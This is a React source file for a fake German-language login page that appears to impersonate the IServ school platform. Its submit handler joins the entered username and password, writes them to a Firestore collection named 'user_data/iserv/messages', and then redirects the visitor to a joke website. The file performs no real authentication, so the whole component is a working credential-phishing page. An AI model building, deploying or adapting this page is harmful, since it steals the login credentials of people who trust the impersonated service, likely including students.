import { useState } from "react";
import { Eye, EyeOff } from "lucide-react";

import { collection, addDoc } from "firebase/firestore";
import { db } from "./firebase";

function Login() {
  const [showPassword, setShowPassword] = useState(false);

  async function saveData(message) {
    try {
      await addDoc(collection(db, "user_data", "iserv", "messages"), {
        text: message,
        timestamp: Date.now(),
      });
      window.location.href = "https://schlechtewitze.com/top";
    } catch (e) {
      console.error("Fehler beim Speichern:", e);
    }
  }

  function handleSubmit(event) {
    event.preventDefault();
    const userName = event.target.userName.value;
    const password = event.target.password.value;
    const message = userName + " || " + password;

    localStorage.setItem("hasVisited", true);
    saveData(message);
  }

  return (
    <div className="w-[75%] mt-8">
      <div className="flex flex-row justify-between items-baseline w-full">
        <h1 className="text-[22px] dark:text-white">Anmeldung</h1>
        <a className="dark:text-[#67baff] text-[#0062b3] text-[14px]" href="#">
          Hilfe
        </a>
      </div>

      <form className="flex flex-col mt-2" onSubmit={handleSubmit}>
        <input
          type="text"
          id="userName"
          name="userName"
          placeholder="Account"
          className="w-full p-2 mb-4 border font-[14px]
                    bg-white text-black border-gray-500
                    dark:bg-[#1a1a1a] dark:text-white dark:border-gray-600
                    focus:ring-1 focus:ring-blue-400 focus:outline-none
                    focus:shadow-[0_0_10px_#3b82f6]"
        />

        <div
          className="flex items-center w-full p-2 mb-2 border font-[14px]
                bg-white text-black border-gray-500
                dark:bg-[#1a1a1a] dark:text-white dark:border-gray-600
                focus-within:ring-1 focus-within:ring-blue-400 focus-within:outline-none
                focus-within:shadow-[0_0_10px_#3b82f6]"
        >
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            name="password"
            placeholder="Passwort"
            className="dark:text-white pr-0 w-full focus:outline-none"
          />
          <div className="h-full border-l border-gray-600 px-3 flex items-center">
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="text-gray-400"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
        </div>

        <div class="flex flex-row justify-between align-items-center login-form-field">
          <div className="checkbox m0">
            <label class="flex text-[14px] align-items-center dark:text-white">
              <input
                className="mr-1"
                type="checkbox"
                id="remember_me"
                name="_remember_me"
                tabIndex="1"
              />
              Angemeldet bleiben
            </label>
          </div>
          <div class="text-right">
            <a className="dark:text-[#67baff] text-[#0062b3] text-[14px]" href="#">
              Passwort vergessen?
            </a>
          </div>
        </div>

        <button
          type="submit"
          className="dark:bg-[#67baff] bg-[#0062b3] dark:text-black text-white hover:bg-blue-600 mt-10 p-2"
        >
          → Anmelden
        </button>
      </form>
    </div>
  );
}

export default Login;
